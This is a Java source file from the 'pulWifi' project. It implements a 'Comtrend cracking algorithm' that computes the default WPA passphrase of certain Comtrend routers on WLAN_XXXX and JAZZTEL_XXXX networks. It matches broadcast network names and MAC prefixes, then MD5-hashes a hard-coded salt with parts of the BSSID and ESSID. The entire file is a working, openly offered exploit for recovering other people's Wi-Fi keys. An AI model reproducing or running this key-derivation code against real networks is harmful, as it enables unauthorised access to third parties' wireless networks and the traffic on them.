/*
 *  pulWifi , Copyright (C) 2011-2012 Javi Pulido / Antonio Vázquez
 *
 *  This file is part of "pulWifi"
 *
 *  "pulWifi" is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  "pulWifi" is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with "pulWifi".  If not, see <http://www.gnu.org/licenses/>.
 */

package es.pulimento.wifi.core.algorithms;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

/**
 * Comtrend cracking algorithm.
 * Exploits a security fail in the following router models:
 * COMTREND CT-5365
 * COMTREND AR5381U
 * This routers use an WPA encryption.
 * The corresponding mac addresses are:
 * 64:68:0C:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
 * 00:1D:20:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
 * 00:1B:20:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
 * 00:23:F8:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
 *
 */
public class ComtrendAlgorithm extends CrackAlgorithm {

	/**
	 * {@inheritDoc}
	 */
	public ComtrendAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	@Override
	protected void setPatterns() {

		// ESSID: WLAN_XXXX
		// BSSID: 64:68:0C:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(64:68:0C:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX / JAZZTEL_XXXX
		// BSSID: 00:1D:20:XX:XX:XX
		addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(00:1D:20:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX / JAZZTEL_XXXX
		// BSSID: 00:1B:20:XX:XX:XX
		addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(00:1B:20:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX / JAZZTEL_XXXX
		// BSSID: 00:23:F8:XX:XX:XX
		addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(00:23:F8:[0-9A-Fa-f:]{8})");
		
		// ESSID : WLAN_XXXX
		// BSSID : 38:72:C0:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(38:72:C0:[0-9A-Fa-f:]{8})");
		
		// Added all macs until version 3 which will be focused on this.
		addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(30:39:F2:[0-9A-Fa-f:]{8})");
		//addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(00:1A:2B:[0-9A-Fa-f:]{8})");//256 keys!!
	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		bssid_data = bssid_data.replace(":", "").toUpperCase();
		essid_data = essid_data.toUpperCase();
   		return MD5Hash("bcgbghgg"+bssid_data.substring(0,8)+essid_data.substring(essid_data.length()-4,essid_data.length())+bssid_data);
	}

	private static String MD5Hash(String input) {
		try {
			String hashtext = (new BigInteger(1, MessageDigest.getInstance("MD5").digest(input.getBytes()))).toString(16);
			while (hashtext.length() < 20)
				hashtext = "0" + hashtext;
			return hashtext.substring(0, 20);
		}
		catch(NoSuchAlgorithmException e) {
			throw new RuntimeException(e);
		}
	}

	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return mCapabilities.equals(WirelessEncryption.WPA);
	}

}
